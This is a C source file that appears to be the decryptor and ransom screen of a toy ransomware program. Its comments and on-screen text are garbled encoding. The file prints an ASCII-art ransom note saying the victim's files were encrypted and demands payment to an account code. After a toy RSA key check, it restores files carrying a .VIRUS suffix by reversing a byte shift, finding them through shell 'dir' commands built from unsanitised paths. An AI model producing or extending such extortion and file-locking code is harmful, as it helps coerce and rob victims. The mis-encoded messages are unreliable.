/*
  ����G2021/1/21
  �@��:HiCat
  ���e:�D�n�{���w�����C

  ����G2021/2/26
  �@��:HiCat
  ���e:�bC�ѨϥήɡA�l��Ƨ��ɮ׸ѱK�|�����C
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <conio.h>

int frequency = 0;

void file_search(char *MainPosition);
void file_read(char *MainPosition);
void folder_search(char *MainPosition);
void decryption(char *encryption_file_position, char *original_file_position);
int powMod(int, int, int);

int powMod(int x, int y, int z) {
    int result = 1 % z;
    x %= z;
    while (y != 0) {
        if ((y & 1) == 1) {
            result = (result * x) % z;
        }
        x = (x * x) % z;
        y >>= 1;
    }
    return result;
}

void file_search(char *MainPosition){
  if(frequency == 0){
    system("dir /B *.VIRUS >> encryption_file_name.txt");
  }
  else{
    char file[100000] = "cd ";
    strcat(file, MainPosition);
    strcat(file, " && dir /B *.VIRUS >> encryption_file_name.txt");
    system(file);
    file_read(MainPosition);
  }
}

void file_read(char *MainPosition){
  FILE *encryption_file_name_read;
  char encryption_file_name[10000];
  if(frequency == 0){
    encryption_file_name_read = fopen("encryption_file_name.txt", "r");
    while(fgets(encryption_file_name, sizeof(encryption_file_name), encryption_file_name_read) != NULL){
      char original_file_name[10000] = "";
      strtok(encryption_file_name, "\n");
      strcat(original_file_name, encryption_file_name);
      strtok(original_file_name, "VIRUS");
      decryption(encryption_file_name, original_file_name);
    }
    fclose(encryption_file_name_read);
    frequency++;
    folder_search(MainPosition);
  }
  else{
    char file[100000];
    strcat(encryption_file_name, MainPosition);
    strcat(encryption_file_name, "\\");
    strcpy(file, MainPosition);
    strcat(file, "\\encryption_file_name.txt");
    encryption_file_name_read = fopen(file, "r");
    char excessive_string[100000];
    while(fgets(excessive_string, sizeof(excessive_string), encryption_file_name_read) != NULL){
      strcpy(encryption_file_name, MainPosition);
      strcat(encryption_file_name, "\\");
      char original_file_name[10000];
      strcpy(original_file_name, MainPosition);
      strcat(original_file_name, "\\");
      strtok(excessive_string, "\n");
      strcat(original_file_name, excessive_string);
      strcat(encryption_file_name, excessive_string);
      //strtok(original_file_name, "VIRUS");
      int i = strlen(original_file_name)-6;
      original_file_name[i] = '\0';
      printf("%s", original_file_name);
      system("pause");
      decryption(encryption_file_name, original_file_name);
    }
    fclose(encryption_file_name_read);
    remove(file);
    folder_search(MainPosition);
  }
}

void folder_search(char *MainPosition){
  strtok(MainPosition, "\n");
  char folder[100000] = "cd ";
  strcat(folder, MainPosition);
  strcat(folder, " && dir /AD /B >> folder.txt");
  system(folder);
  strcpy(folder, "");
  strcat(folder, MainPosition);
  strcat(folder, "\\folder.txt");
  FILE *folder_name_read;
  folder_name_read = fopen(folder, "r");
  char folder_name[100000];
  char MainPosition_copy[100000];
  strcpy(MainPosition_copy, MainPosition);
  while(fgets(folder_name, sizeof(folder_name), folder_name_read) != NULL){
    strtok(folder_name, "\n");
    strcat(MainPosition, "\\");
    strcat(MainPosition, folder_name);
    file_search(MainPosition);
    strcpy(MainPosition, MainPosition_copy);
  }
  fclose(folder_name_read);
  remove(folder);
}

void decryption(char *encryption_file_position, char *original_file_position){
  FILE *encryption_file_read, *original_file_read;
  encryption_file_read = fopen(encryption_file_position, "rb");
  original_file_read = fopen(original_file_position, "wb");

  unsigned char ch;
  while(!feof(encryption_file_read)){
   fread(&ch, sizeof(ch), 1, encryption_file_read);
    if(!feof(encryption_file_read)){
      //�ѱK���a��
      ch = ch - 32;
      fwrite(&ch, sizeof(ch), 1, original_file_read);
    }
  }
  fclose(encryption_file_read);
  fclose(original_file_read);
  remove(encryption_file_position);
}

int main(void){
  printf("          *                    *                                                    \n");
  printf("         * *                  * *                                                   \n");
  printf("        *   *                *   *                                                  \n");
  printf("       *     *              *     *                                                 \n");
  printf("      *       *            *       *                                                \n");
  printf("     *         *          *         *                                               \n");
  printf("    *           **********           *      �A�b����Ƨ��Ҧ�txt���ɦW���ɮ׳��Q�ڥ[�K�F�A\n");
  printf("   *    ****                   ****   *     �p�G�Q�n�^�A���ɮסA�N���ӧڻ������C        \n");
  printf("  *       ********       ********      *                                            \n");
  printf(" *          *******************         *                                           \n");
  printf("*            *****      *****            *                                          \n");
  printf("*         *   ***    *   ***     *        *                                         \n");
  printf(" *          *       ***       *           *                                         \n");
  printf("  *           *      *      *            *                                          \n");
  printf("   *   *  *  *               *  *  *    *                                           \n");
  printf("    *        *      * *     *          *                                            \n");
  printf("     *     *         *        *      *                                              \n");
  printf("      *   *                     *   *                                               \n");
  printf("     *                               *                                              \n");
  printf("    *                                 *                                             \n");
  printf("   *                                   *                                            \n");
  printf("  *                                     *                                           \n");
  printf(" *                                       *                                          \n");
  printf("*                                         *                                         \n");
  printf("*******************************************                                         \n");
  printf("____________________________________________________________________________________\n");
  printf("1>{�ڸӫ���} 2>�A�O�� 3>�ڦ��ѱK���_\n");
  int ch, a;
  while(1){
    if(_kbhit()){
      ch = _getch();
      if(ch == 49){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *      �A�b����Ƨ��Ҧ�txt���ɦW���ɮ׳��Q�ڥ[�K�F�A\n");
	printf("   *    ****                   ****   *     �p�G�Q�n�^�A���ɮסA�N���ӧڻ������C        \n");
	printf("  *       ********       ********      *                                            \n");
	printf(" *          *******************         *                                           \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("1>{�ڸӫ���} 2>�A�O�� 3>�ڦ��ѱK���_\n");
	a = ch;
      }
      else if(ch == 50){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *      �A�b����Ƨ��Ҧ�txt���ɦW���ɮ׳��Q�ڥ[�K�F�A\n");
	printf("   *    ****                   ****   *     �p�G�Q�n�^�A���ɮסA�N���ӧڻ������C        \n");
	printf("  *       ********       ********      *                                            \n");
	printf(" *          *******************         *                                           \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("1>�ڸӫ��� 2>{�A�O��} 3>�ڦ��ѱK���_\n");
	a = ch;
      }
      else if(ch == 51){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *      �A�b����Ƨ��Ҧ�txt���ɦW���ɮ׳��Q�ڥ[�K�F�A\n");
	printf("   *    ****                   ****   *     �p�G�Q�n�^�A���ɮסA�N���ӧڻ������C        \n");
	printf("  *       ********       ********      *                                            \n");
	printf(" *          *******************         *                                           \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("1>�ڸӫ��� 2>�A�O�� 3>{�ڦ��ѱK���_}\n");
	a = ch;
      }
      else if(ch == 13 && a == 49){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *                                              \n");
	printf("   *    ****                   ****   *     �бN3.5�T��S���פJ�o�ӵ������]��:         \n");
	printf("  *       ********       ********      *        {WTF52695269GG11TAVNO1}             \n");
	printf(" *          *******************         *                                           \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("1>{�ڸӫ���} 2>�A�O�� 3>�ڦ��ѱK���_\n");
      }
      else if(ch == 13 && a == 50){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *        �ڬO�ͬ��b�¶ª������ت��@�W�b�ȡA        \n");
	printf("   *    ****                   ****   *       �̪�ڷQ�RPS5�A                         \n");
	printf("  *       ********       ********      *      �����Y���I��A                          \n");
	printf(" *          *******************         *     �ҥH�Q��A�n�@�I���C                     \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("1>�ڸӫ��� 2>{�A�O��} 3>�ڦ��ѱK���_\n");
      }
      else if(ch == 13 && a == 51){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *                                              \n");
	printf("   *    ****                   ****   *                                             \n");
	printf("  *       ********       ********      *                                            \n");
	printf(" *          *******************         *                                           \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("�п�J�A���ѱK���_: ");
	int key;
	scanf("%d", &key);
	//p=11, q=17, n=p*q = 187, (p-1)(q-1) = 160, e=7, d=23, key = 183
	key = powMod(key, 23, 187);
	if(key == 123){
	  printf("          *                    *                                                    \n");
	  printf("         * *                  * *                                                   \n");
	  printf("        *   *                *   *                                                  \n");
	  printf("       *     *              *     *                                                 \n");
	  printf("      *       *            *       *                                                \n");
	  printf("     *         *          *         *        �A���K�_���T�P�§A���٧U^_^ ^_^           \n");
	  printf("    *           **********           *                                              \n");
	  printf("   *    ****                   ****   *                                             \n");
	  printf("  *       ********       ********      *                                            \n");
	  printf(" *          *******************         *                                           \n");
	  printf("*            *****      *****            *                                          \n");
	  printf("*         *   ***    *   ***     *        *                                         \n");
	  printf(" *          *       ***       *           *                                         \n");
	  printf("  *           *      *      *            *                                          \n");
	  printf("   *   *  *  *               *  *  *    *                                           \n");
	  printf("    *        *      * *     *          *                                            \n");
	  printf("     *     *         *        *      *                                              \n");
	  printf("      *   *                     *   *                                               \n");
	  printf("     *                               *                                              \n");
	  printf("    *                                 *                                             \n");
	  printf("   *                                   *                                            \n");
	  printf("  *                                     *                                           \n");
	  printf(" *                                       *                                          \n");
	  printf("*                                         *                                         \n");
	  printf("*******************************************                                         \n");
	  printf("____________________________________________________________________________________\n");
	  
	  char MainPosition[100000];
	  system("cd >> main_position.txt");
	  FILE *fptr;
	  fptr = fopen("main_position.txt", "r");
	  fgets(MainPosition, sizeof(MainPosition), fptr);
	  fclose(fptr);
	  remove("main_position.txt");
	  
	  file_search(MainPosition);
	  file_read(MainPosition);
	  remove("hack.txt");
	  system("cls");
	  printf("          *                    *                                                    \n");
	  printf("         * *                  * *                                                   \n");
	  printf("        *   *                *   *                                                  \n");
	  printf("       *     *              *     *                                                 \n");
	  printf("      *       *            *       *                                                \n");
	  printf("     *         *          *         *        ��Ƥw�ѱK����!!                         \n");
	  printf("    *           **********           *                                              \n");
	  printf("   *    ****                   ****   *                                             \n");
	  printf("  *       ********       ********      *                                            \n");
	  printf(" *          *******************         *                                           \n");
	  printf("*            *****      *****            *                                          \n");
	  printf("*         *   ***    *   ***     *        *                                         \n");
	  printf(" *          *       ***       *           *                                         \n");
	  printf("  *           *      *      *            *                                          \n");
	  printf("   *   *  *  *               *  *  *    *                                           \n");
	  printf("    *        *      * *     *          *                                            \n");
	  printf("     *     *         *        *      *                                              \n");
	  printf("      *   *                     *   *                                               \n");
	  printf("     *                               *                                              \n");
	  printf("    *                                 *                                             \n");
	  printf("   *                                   *                                            \n");
	  printf("  *                                     *                                           \n");
	  printf(" *                                       *                                          \n");
	  printf("*                                         *                                         \n");
	  printf("*******************************************                                         \n");
	  printf("____________________________________________________________________________________\n");
	  remove("encryption_file_name.txt");
	  system("pause");
	  return 0;
	}
	else{
	  system("cls");
	  printf("          *                    *                                                    \n");
	  printf("         * *                  * *                                                   \n");
	  printf("        *   *                *   *                                                  \n");
	  printf("       *     *              *     *                                                 \n");
	  printf("      *       *            *       *                                                \n");
	  printf("     *         *          *         *                                               \n");
	  printf("    *           **********           *       �A���K�_�����T                          \n");
	  printf("   *                                  *         �A���K�_�����T                        \n");
	  printf("  *       *******        *******       *           �A���K�_�����T                    \n");
	  printf(" *           *              *           *              �A���K�_�����T                 \n");
	  printf("*            *              *            *                  �A���K�_�����T           \n");
	  printf("*         *          *           *        *                     �A���K�_�����T         \n");
	  printf(" *          *       ***       *           *                                         \n");
	  printf("  *           *      *      *            *                                          \n");
	  printf("   *   *  *  *    *      *   *  *  *    *                                           \n");
	  printf("    *        *     *    *   *          *                                            \n");
	  printf("     *     *       *    *     *      *                                              \n");
	  printf("      *   *       *      *      *   *                                               \n");
	  printf("     *                               *                                              \n");
	  printf("    *                                 *                                             \n");
	  printf("   *                                   *                                            \n");
	  printf("  *                                     *                                           \n");
	  printf(" *                                       *                                          \n");
	  printf("*                                         *                                         \n");
	  printf("*******************************************                                         \n");
	  printf("____________________________________________________________________________________\n");
	}
      }
    }
  }
  
  

  
  system("pause");
  return 0;
}
